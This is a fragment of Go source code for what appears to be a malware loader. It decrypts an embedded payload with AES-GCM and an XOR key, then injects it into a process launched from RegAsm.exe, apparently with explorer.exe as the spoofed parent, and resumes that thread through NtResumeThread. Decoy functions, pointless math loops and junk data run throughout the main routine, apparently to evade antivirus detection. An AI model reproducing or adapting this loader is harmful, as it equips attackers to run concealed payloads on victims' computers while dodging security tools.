								pNtResumeThreadResult, _, _ := pNtResumeThread.Call(uintptr(pi.Thread), uintptr(0))
								if pNtResumeThreadResult == 0 {
									return true, pi
								} else {
									return false, pi
								}
							} else {
								return false, pi
							}
						}
					}
				}
			}
		}
	}
	return false, nil
}

// https://pkg.go.dev/embed
//
//go:embed key.txt
var k string

//go:embed pe.txt
var s string

func main() {

	x := 3.14159
	for i := 0; i < 100; i++ {
		x = math.Sin(x) + math.Cos(x*0.7)
		x = math.Sqrt(math.Abs(x)) * 1.5
	}

	keyParts := strings.Split(k, ":")
	aesKey := []byte(keyParts[0])
	xorKey := byte(42)

	junkData := make([]byte, 1024)
	for i := 0; i < len(junkData); i++ {
		junkData[i] = byte((i * 7) % 256)
	}
	junkStr := base64.StdEncoding.EncodeToString(junkData[:128])
	_ = junkStr

	if len(keyParts) > 1 {
		xorValue, err := strconv.Atoi(keyParts[1])
		if err == nil {
			xorKey = byte(xorValue)
		}
	}
	Point()
	possibleFiles := []string{
		fmt.Sprintf("temp_%d.cfg", rand.Int()%1000),
		fmt.Sprintf("config_%d.dat", rand.Int()%1000),
	}
	for _, file := range possibleFiles {
		_, _ = ioutil.ReadFile(file)
	}

	src := "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe"

	if rand.Float64() < 0.999999 {
		sum := 0
		for i := 0; i < 500; i++ {
			sum += i * i % 100
		}
		_ = sum
	}

	shellcode, err := doubleDecrypt([]byte(s), aesKey, xorKey)
	if err != nil {
		log.Fatal(err)
	}
	JSON()
	go func() {
		time.Sleep(time.Hour)
		fmt.Println("This will never execute")
	}()

	LoadPE(src, shellcode, "explorer.exe")
}
func JSON() {
	type Person struct {
		Name    string   `json:"name"`
		Age     int      `json:"age"`
		Hobbies []string `json:"hobbies"`
	}

	people := []Person{
		{"Alice", 30, []string{"Reading", "Hiking"}},
		{"Bob", 25, []string{"Gaming", "Swimming"}},
		{"Charlie", 35, []string{"Cooking", "Photography"}},
	}

	jsonData, _ := json.Marshal(people)
	var decoded []Person
	_ = json.Unmarshal(jsonData, &decoded)

	for i := range decoded {
		decoded[i].Age += 5
		decoded[i].Hobbies = append(decoded[i].Hobbies, "Sleeping")
	}

	_, _ = json.Marshal(decoded)
}
func Point() {
	values := make([]float64, 1000)
	for i := range values {
		values[i] = rand.Float64() * 100
	}

	for i := 0; i < 100; i++ {
		for j := range values {
			values[j] = math.Sin(values[j]) + math.Cos(values[j]*0.5)
			values[j] = math.Sqrt(math.Abs(values[j])) * 1.5
			values[j] = math.Pow(values[j], 1.1)
		}
	}

	sum := 0.0
	for _, v := range values {
		sum += v
	}
	_ = sum
}
func doubleDecrypt(cypherText []byte, aesKey []byte, xorKey byte) ([]byte, error) {

	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(cypherText) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := cypherText[:nonceSize], cypherText[nonceSize:]
	xorText, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}

	decrypted := make([]byte, len(xorText))
	for i := 0; i < len(xorText); i++ {
		decrypted[i] = xorText[i] ^ xorKey
	}

	return hex.DecodeString(string(decrypted))
}

func decrypt(cypherText []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		log.Fatal(err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		log.Fatal(err)
	}
	plainText, err := gcm.Open(nil, cypherText[:gcm.NonceSize()], cypherText[gcm.NonceSize():], nil)
	if err != nil {
		log.Fatal(err)
	}
	return plainText, nil
}
